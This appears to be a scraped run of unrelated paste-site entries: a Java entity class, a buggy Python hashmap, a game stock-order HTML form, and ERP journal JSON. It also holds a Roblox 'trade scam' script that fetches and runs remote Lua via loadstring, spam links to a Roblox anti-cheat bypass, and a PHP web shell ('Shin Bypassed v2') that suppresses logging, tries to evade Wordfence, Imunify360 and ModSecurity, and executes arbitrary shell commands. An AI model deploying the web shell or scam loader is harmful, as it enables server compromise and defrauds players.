loadstring(game:HttpGet(""https://raw.githubusercontent.com/Muhammed6196/Trading/main/Main.lua"" ))()

--Executors: Codex, Delta, ArceusX (My Opinion that Arceus X Best)

-- Updated Log 2024/01/01                -- Updated Log 2024/01/02
-- Trade Scam With Charms					-- Trade Scam With Booths
-- Trade Scam With Eggs						-- Fixed Crash When Loading
-- Trade Scam With Potions					-- Trade Scam With HoverBoards
-- Trade Scam with Faster Performance		-- Trade Scam with Titanics"
t2ijrcuv,Entity Example,AdiaLandfall,Java,Monday 1st of January 2024 11:07:31 PM CDT,"package hay.formslibrary.persist.entity;

import java.io.Serializable;
import java.time.Instant;
import java.util.UUID;

import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.Lob;
import javax.persistence.PrePersist;
import javax.persistence.PreUpdate;

import com.fasterxml.jackson.annotation.JsonIgnore;
import com.fasterxml.jackson.annotation.JsonRawValue;
import com.fasterxml.jackson.databind.annotation.JsonDeserialize;
import com.fasterxml.jackson.databind.annotation.JsonSerialize;

@Entity(name=""Report"")
public class Report implements Serializable {
    @Id @Column(name = ""pk"") private String pk;
    @Column(name=""name"") private String name;
    @Column(name=""author"", updatable = false) private String author;
    @Column(name=""editor"") private String editor;
    @Column(name=""created"", nullable = false, updatable = false)
    private Instant created;
    @Column(name=""updated"", nullable = false) private Instant updated;
    @JsonDeserialize(using = KeepAsJsonDeserializer.class)
    @JsonRawValue
    @Column(name=""data"") @Lob private String data;

    public String getPk(){return pk;}
    public String getName(){return name;}
    public void setName(String name){this.name = name;}
    public String getAuthor(){return author;}
    public void setAuthor(String author){this.author = author;}
    public String getEditor(){return editor;}
    public void setEditor(String editor){this.editor = editor;}

    @JsonSerialize(using = UTCSerializer.class)
    public Instant getCreated(){return created;}
    @JsonSerialize(using = UTCSerializer.class)
    public Instant getUpdated(){return updated;}

    @JsonIgnore
    public String getData(){return data;}
    public void setData(String data){this.data = data;}

    @PrePersist
    protected void onCreate(){
        pk = UUID.randomUUID().toString();
        // defaults to UTC
        if( created==null ) created = Instant.now();
        updated = Instant.now();
    }

    @PreUpdate
    protected void onUpdate(){
        updated = Instant.now();
    }


    @Override
    public String toString() {
        return ""Report [pk="" +pk  +"", name=""+name
                +"", data=""+data  +""]"";
    }
}"
DgqsUSBW,hash map design,nirajs,Python,Monday 1st of January 2024 09:59:05 PM CDT,"""""""
Design generic hashMap with iterator
    get(ele)
    put(ele, val)
""""""

class HashMap:

    def __init__(self, n):
        self.cache = [[]] * n # each value is list
        self.n = n

    def __calculateHash(self, val) -> int:
        return hash(val) % self.n

    def get(self, ele):
        index = self.__calculateHash(ele)
        for k, v in self.cache[index]:
            if k == key:
                return v
        return None

    def put(self, key, val):
        index = self.__calculateHash(key)
        # Overwrite the value if the key already exists
        for i, (k, _) in enumerate(self.cache[index]):
            if k == key:
                self.cache[index][i] = (key, val)
                return
        # If the key is new, append it to the list at the calculated index
        self.cache[index].append((key, val))

    def __iter__(self):
        for bucket in self.cache:
            for key, value in bucket:
                yield key, value

# Testing
map = HashMap(10)

map.put(""one"", 30)
map.put(""two"", 31)
map.put(3, 40)

for k, v in map:
    print(k, v)


"
DnnbRMvr,Content,Pjfry2184575,JavaScript,Monday 1st of January 2024 09:23:19 PM CDT,"<form action=""companies.php?step=stock1"">
    <div class=""title p10"" tabindex=""0"">
        <p class=""bold m-bottom3"">
            Stock Shipments:
        </p>
        <p>
            You may need to order shipments of items so that you can sell them in your store.
            When ordering, you will need to select how many of whatever stock you like and pay for them out of the company bank.
            After the delivery time, they will be delivered into your company storage and be ready for customers to buy.
            Go to the pricing menu to change how much you want to charge your customers for the shipped items.
        </p>
    </div>
    <div class=""stock-list-wrap"">
        <ul class=""stock-list-title bold t-hide"">
            <li class=""name"">Item Name (MaxStock) (MaxStock)</li>
            <li class=""stock"">
                In Stock
                 (+order) (+order)<div class=""t-delimiter""></div>
            </li>
            <li class=""sold-daily"">
                Sold Daily
                <div class=""t-delimiter""></div>
            </li>
            <li class=""cost"">
                Cost Each
                <div class=""t-delimiter""></div>
            </li>
            <li class=""rrp"">
                RRP
                <div class=""t-delimiter""></div>
            </li>
            <li class=""delivery"">
                Delivery
                <div class=""t-delimiter""></div>
            </li>
            <li class=""quantity"">
                Quantity
                <div class=""t-delimiter""></div>
            </li>
            <li class=""clear""></li>
        </ul>
        <ul class=""stock-list fm-list t-blue-cont h ui-accordion ui-widget ui-helper-reset"" role=""tablist"">
                        <li class=""new"">
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-0"" aria-controls=""ui-accordion-1-panel-0"" aria-selected=""false"" tabindex=""0""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Dining Chair                 (7,577) (7,577)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-0"" aria-labelledby=""ui-accordion-1-header-0"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            4,806                         (4,807) (4,807)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            319                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $50                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $200                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Dining Chair"" type=""text"" value="""" data-default="""" data-cost=""50"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Dining Chair"" type=""hidden"" name=""stockID[114]"" value=""649"" data-default="""" data-cost=""50"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li class=""new"">
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-1"" aria-controls=""ui-accordion-1-panel-1"" aria-selected=""false"" tabindex=""-1""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Bedside Table                 (2,992) (2,042) (2,992) (2,042)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-1"" aria-labelledby=""ui-accordion-1-header-1"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            2,523                         (2,524) (2,225) (2,524) (2,225)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            126                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $100                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $400                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Bedside Table"" type=""text"" value="""" data-default="""" data-cost=""100"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Bedside Table"" type=""hidden"" name=""stockID[117]"" value=""110"" data-default="""" data-cost=""100"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li>
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-2"" aria-controls=""ui-accordion-1-panel-2"" aria-selected=""false"" tabindex=""-1""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Coffee Table                 (1,733) (1,733)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-2"" aria-labelledby=""ui-accordion-1-header-2"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            2,013                         (2,014) (2,014)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            73                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $200                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $600                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Coffee Table"" type=""text"" value="""" data-default="""" data-cost=""200"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Coffee Table"" type=""hidden"" name=""stockID[112]"" value="""" data-default="""" data-cost=""200"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li>
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-3"" aria-controls=""ui-accordion-1-panel-3"" aria-selected=""false"" tabindex=""-1""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Entertainment Unit                 (973) (973)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-3"" aria-labelledby=""ui-accordion-1-header-3"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            1,678                         (1,679) (1,679)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            41                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $250                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $800                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Entertainment Unit"" type=""text"" value="""" data-default="""" data-cost=""250"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Entertainment Unit"" type=""hidden"" name=""stockID[113]"" value="""" data-default="""" data-cost=""250"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li>
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-4"" aria-controls=""ui-accordion-1-panel-4"" aria-selected=""false"" tabindex=""-1""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Dining Table                 (1,282) (1,282)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-4"" aria-labelledby=""ui-accordion-1-header-4"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            1,817                         (1,818) (1,818)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            54                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $400                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $1,200                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Dining Table"" type=""text"" value="""" data-default="""" data-cost=""400"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Dining Table"" type=""hidden"" name=""stockID[115]"" value="""" data-default="""" data-cost=""400"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li>
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-5"" aria-controls=""ui-accordion-1-panel-5"" aria-selected=""false"" tabindex=""-1""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Display Cabinet                 (332) (332)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-5"" aria-labelledby=""ui-accordion-1-header-5"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            1,393                         (1,394) (1,394)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            14                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $450                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $1,400                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Display Cabinet"" type=""text"" value="""" data-default="""" data-cost=""450"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Display Cabinet"" type=""hidden"" name=""stockID[116]"" value="""" data-default="""" data-cost=""450"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li>
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-6"" aria-controls=""ui-accordion-1-panel-6"" aria-selected=""false"" tabindex=""-1""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Bed                 (2,042) (2,042)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-6"" aria-labelledby=""ui-accordion-1-header-6"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            2,224                         (2,225) (2,225)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            86                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $450                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $1,450                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Bed"" type=""text"" value="""" data-default="""" data-cost=""450"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Bed"" type=""hidden"" name=""stockID[118]"" value="""" data-default="""" data-cost=""450"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li class=""new"">
                <div class=""name bold t-gray-9 acc-header t-overflow ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons"" role=""tab"" id=""ui-accordion-1-header-7"" aria-controls=""ui-accordion-1-panel-7"" aria-selected=""false"" tabindex=""-1""><span class=""ui-accordion-header-icon ui-icon ui-icon-triangle-1-e""></span>
                    <div class=""arrow-999 t-show right""></div>
                    Sofa                 (3,064) (3,064)</div>
                <div class=""acc-body left ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom"" id=""ui-accordion-1-panel-7"" aria-labelledby=""ui-accordion-1-header-7"" role=""tabpanel"" aria-expanded=""false"" aria-hidden=""true"" style=""display: none;"">
                    <div class=""info-wrap left"">
                        <div class=""stock"">
                            <span class=""bold t-show"">In Stock:</span>
                            2,702                         (2,703) (2,703)</div>
                        <div class=""sold-daily"">
                            <span class=""bold t-show"">Sold Daily:</span>
                            129                        </div>
                        <div class=""cost"">
                            <span class=""bold t-show"">Cost Each:</span>
                            $600                        </div>
                        <div class=""rrp"">
                            <span class=""bold t-show"">RRP:</span>
                            $1,800                        </div>
                        <div class=""delivery"">
                            <span class=""bold t-show"">Delivery:</span>
                            24 hours                        </div>
                        <div class=""clear""></div>
                    </div>
                    <div class=""quantity"">
                        <span class=""bold t-show"">Quantity:</span>
                        <div class=""input-money-group no-max-value""><input aria-label=""Sofa"" type=""text"" value="""" data-default="""" data-cost=""600"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""><input aria-label=""Sofa"" type=""hidden"" name=""stockID[111]"" value=""84"" data-default="""" data-cost=""600"" data-lpignore=""true"" autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" class=""input-money""></div>
                    </div>
                    <div class=""clear""></div>
                </div>
                <div class=""clear""></div>
            </li>
                        <li class=""total t-hide"">
                <div class=""name bold"">Total</div>
                <div class=""stock bold"">
                    19,156                    <div class=""b-delimiter""></div>
                </div>
                <div class=""sold-daily bold"">
                    842                    <div class=""b-delimiter""></div>
                </div>
                <div class=""cost t-gray-9"">
                    N/A                    <div class=""b-delimiter""></div>
                </div>
                <div class=""rrp t-gray-9"">
                    $N/A                    <div class=""b-delimiter""></div>
                </div>
                <div class=""delivery t-gray-9"">
                    N/A
                    <div class=""b-delimiter""></div>
                </div>
                <div class=""quantity bold"">
                    <span class=""amount"">843</span>
                    <div class=""b-delimiter""></div>
                </div>
                <div class=""clear""></div>
            </li>
            <li class=""quantity t-show bold"">Total quantity: <span class=""amount"">843</span></li>
            <li class=""total t-show bold"">Total Items In Stock: 19,156</li>
        </ul>
    </div>

    <div id=""stock_confirm"" style=""display: none;"" class=""title p10"" tabindex=""0""></div>

    <div class=""total-price bold"">
        Total price:
        $<span class=""amount"">93,850</span>
    </div>

    <div class=""storage-capacity bold"">
        Storage capacity:
        <span class=""current"" data-initial=""19156"">19,999</span>
        /
        <span class=""max"" data-initial=""20000"">20,000</span>
    </div>

    <span class=""order btn-wrap silver"">
        <span class=""btn"">
            <button class=""torn-btn"">PLACE ORDER</button>
        </span>
    </span>

    <a href=""#/"" class=""clear-all t-blue h m-left10 c-pointer wai-link m-top10"">Clear All</a>

    <span class=""confirm btn-wrap silver hidden"">
        <span class=""btn"">
            <button class=""torn-btn"">CONFIRM</button>
        </span>
    </span>

    <span class=""back m-left10 c-pointer hidden"">
        <a href=""#"" class=""wai-support t-blue h"">Go Back</a>
    </span>
<span class=""btn-wrap silver""><span class=""btn""><button class=""torn-btn"" id=""kw-test-form-content"" i-data=""i_182_2211_131_34"">Copy Form Content</button></span></span><span class=""btn-wrap silver""><span class=""btn""><button class=""torn-btn"" id=""kw-auto-fill"">Auto-fill</button></span></span><span class=""btn-wrap silver""><span class=""btn""><button class=""torn-btn"" id=""kw-test-form-content"">Copy Form Content</button></span></span></form>"
cYUvADkP,QA UpdateJournalEntry TOKO,BlackBoY_,JSON,Monday 1st of January 2024 09:02:09 PM CDT,"{
    ""docname"":""ACC-JV-2024-00001"",
    ""updates"":{
        ""voucher_type"": ""Journal Entry"",
        ""company"": ""Kopkar Toyota"",
        ""posting_date"": ""2023-12-21"",
        ""cheque_no"": ""Toko-Nov2023"",
        ""cheque_date"": ""2023-12-21"",
        ""total_debit"": 4000000000.0,
        ""total_credit"": 4000000000.0,
        ""difference"": 0.0,
        ""multi_currency"": 0,
        ""total_amount_currency"": ""IDR"",
        ""total_amount"": 4000000000.0,
        ""accounts"": [
            {
                ""account"": ""130-10"",
                ""account_type"": ""Receivable"",
                ""balance"": 12000000.0,
                ""party_type"": ""Customer"",
                ""party"": ""Anggota"",
                ""party_balance"": 12000000.0,
                ""cost_center"": ""Main - Kopkar Toyota"",
                ""account_currency"": ""IDR"",
                ""exchange_rate"": 1.0,
                ""debit_in_account_currency"": 4000000000.0,
                ""debit"": 4000000000.0,
                ""credit_in_account_currency"": 0.0,
                ""credit"": 0.0,
                ""is_advance"": ""No"",
                ""against_account"": ""Family Mart"",
                ""parentfield"": ""accounts"",
                ""parenttype"": ""Journal Entry"",
                ""doctype"": ""Journal Entry Account""
            },
            {

                ""account"": ""210-10"",
                ""account_type"": ""Payable"",
                ""balance"": -12000000.0,
                ""party_type"": ""Supplier"",
                ""party"": ""Family Mart"",
                ""party_balance"": 0.0,
                ""cost_center"": ""Main - Kopkar Toyota"",
                ""account_currency"": ""IDR"",
                ""exchange_rate"": 1.0,
                ""debit_in_account_currency"": 0.0,
                ""debit"": 0.0,
                ""credit_in_account_currency"": 4000000000.0,
                ""credit"": 4000000000.0,
                ""is_advance"": ""No"",
                ""against_account"": ""Anggota"",
                ""parentfield"": ""accounts"",
                ""parenttype"": ""Journal Entry"",
                ""doctype"": ""Journal Entry Account""
            }
    ]   
    }  
}"
3M8XQtQ4,QA CreateJournalEntry TOKO,BlackBoY_,JSON,Monday 1st of January 2024 08:58:12 PM CDT,"{
    ""voucher_type"": ""Journal Entry"",
    ""company"": ""Kopkar Toyota"",
    ""posting_date"": ""2023-12-29"",
    ""cheque_no"": ""Toko-Nov2023"",
    ""cheque_date"": ""2023-12-29"",
    ""difference"": 0.0,
    ""multi_currency"": 0,
    ""total_amount_currency"": ""IDR"",
    ""accounts"": [
        {
            ""account"": ""510-11"",
            // ""account_type"": ""Receivable"",
            // ""party_type"": ""Customer"",
            // ""party"": ""Anggota"",
            ""cost_center"": ""Main - Kopkar Toyota"",
            ""account_currency"": ""IDR"",
            ""exchange_rate"": 1.0,
            ""debit_in_account_currency"": 4000000000.0,
            ""debit"": 4000000000.0,
            ""credit_in_account_currency"": 0.0,
            ""credit"": 0.0,
            ""is_advance"": ""No"",
            ""against_account"": ""Family Mart"",
            ""parentfield"": ""accounts"",
            ""parenttype"": ""Journal Entry"",
            ""doctype"": ""Journal Entry Account""
        },
        {
            ""account"": ""148-01"",
            // ""account_type"": ""Payable"",
            // ""party_type"": """",
            // ""party"": """",
            ""party_balance"": 0.0,
            ""cost_center"": ""Main - Kopkar Toyota"",
            ""account_currency"": ""IDR"",
            ""exchange_rate"": 1.0,
            ""debit_in_account_currency"": 0.0,
            ""debit"": 0.0,
            ""credit_in_account_currency"": 4000000000.0,
            ""credit"": 4000000000.0,
            ""is_advance"": ""No"",
            ""against_account"": ""Anggota"",
            ""parentfield"": ""accounts"",
            ""parenttype"": ""Journal Entry"",
            ""doctype"": ""Journal Entry Account""
        }
    ]
}
"
LVHDTRau,Roblox Byfron Bypass 2024,Artani,Lua,Monday 1st of January 2024 08:52:42 PM CDT,"ROBLOX BYFRON BYPASS TUTORIAL AND DOWNLOAD LINK
https://www.youtube.com/watch?v=Kd2oL3WwBl0&t=114s 
COPY LINK INTO BROWSER TO GET ROBLOX BYFRON BYPASS 2024"
jHzZ0jMp,BYFRON BYPASS 2024,Artani,Lua,Monday 1st of January 2024 08:51:53 PM CDT,"GET HERE
https://www.youtube.com/watch?v=Kd2oL3WwBl0&t=114s 
BYPASS BYFRON 2024 ROBLOX"
cRkTyZCf,Shin Bypassed v2,willysec_id,PHP,Monday 1st of January 2024 08:38:52 PM CDT,"﻿<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}
if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}
if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}
if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
function getFileDetails($path)
{
    $folders = [];
    $files = [];

    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }

        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}
function formatSize($size)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}
function executeCommand($command)
{
    $currentDirectory = getCurrentDirectory();
    $command = ""cd $currentDirectory && $command"";

    $output = '';
    $error = '';

    // proc_open
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = @proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        $returnValue = proc_close($process);

        $output = trim($output);
        $error = trim($error);

        if ($returnValue === 0 && !empty($output)) {
            return $output;
        } elseif (!empty($error)) {
            return 'Error: ' . $error;
        }
    }

    // shell_exec
    $shellOutput = @shell_exec($command);
    if ($shellOutput !== null) {
        $output = trim($shellOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        $error = error_get_last();
        if (!empty($error)) {
            return 'Error: ' . $error['message'];
        }
    }

    // exec
    @exec($command, $execOutput, $execStatus);
    if ($execStatus === 0) {
        $output = implode(PHP_EOL, $execOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // passthru
    ob_start();
    @passthru($command, $passthruStatus);
    $passthruOutput = ob_get_clean();
    if ($passthruStatus === 0) {
        $output = $passthruOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // system
    ob_start();
    @system($command, $systemStatus);
    $systemOutput = ob_get_clean();
    if ($systemStatus === 0) {
        $output = $systemOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    return 'Error: Command execution failed.';
}
